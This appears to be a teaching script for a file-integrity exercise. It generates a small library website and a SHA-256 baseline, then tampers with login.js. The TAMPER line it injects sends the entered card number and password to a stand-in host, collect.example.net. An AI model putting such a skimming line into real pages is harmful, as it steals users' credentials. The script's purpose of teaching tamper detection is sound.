"""Generate Week 2 data: a tiny website, its known-good hash manifest, then one tampered file.

The tampered file sends passwords to collect.example.net, a reserved domain that cannot be reached.

Usage:
    python tools/generate_week02_data.py weeks/week02-hashing-integrity/data
"""
import hashlib
import json
import os
import sys

FILES = {
    "index.html": "<!doctype html>\n<html><head><title>Riverside Library</title>\n<link rel=\"stylesheet\" href=\"style.css\"></head>\n<body><h1>Welcome to Riverside Library</h1>\n<p>Open Monday to Saturday, 9 to 6.</p>\n<a href=\"about.html\">About us</a> | <a href=\"login.html\">Member login</a>\n</body></html>\n",
    "about.html": "<!doctype html>\n<html><head><title>About</title></head>\n<body><h1>About Riverside Library</h1>\n<p>Serving our town since 1962.</p></body></html>\n",
    "login.html": "<!doctype html>\n<html><head><title>Member login</title><script src=\"login.js\"></script></head>\n<body><form onsubmit=\"return login()\">\n<input id=\"user\" placeholder=\"Card number\">\n<input id=\"password\" type=\"password\">\n<button>Log in</button></form></body></html>\n",
    "login.js": "function login() {\n  const user = document.getElementById('user').value;\n  const password = document.getElementById('password').value;\n  fetch('/api/login', {method: 'POST', body: JSON.stringify({user, password})});\n  return false;\n}\n",
    "style.css": "body { font-family: sans-serif; margin: 2em; }\nh1 { color: #2a5d84; }\n",
}

TAMPER = "  new Image().src = 'https://collect.example.net/c?u=' + user + '&p=' + password;\n"


def sha256(path):
    with open(path, "rb") as f:
        return hashlib.sha256(f.read()).hexdigest()


def main(out_dir):
    site = os.path.join(out_dir, "website")
    os.makedirs(site, exist_ok=True)
    for name, text in FILES.items():
        with open(os.path.join(site, name), "w") as f:
            f.write(text)
    manifest = {name: sha256(os.path.join(site, name)) for name in sorted(FILES)}
    with open(os.path.join(out_dir, "baseline_hashes.json"), "w") as f:
        json.dump(manifest, f, indent=2)
        f.write("\n")
    # Tamper: an attacker adds one line that leaks passwords.
    js = FILES["login.js"].replace("  fetch(", TAMPER + "  fetch(")
    with open(os.path.join(site, "login.js"), "w") as f:
        f.write(js)
    print("wrote website, baseline_hashes.json, and tampered login.js in", out_dir)


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "data")
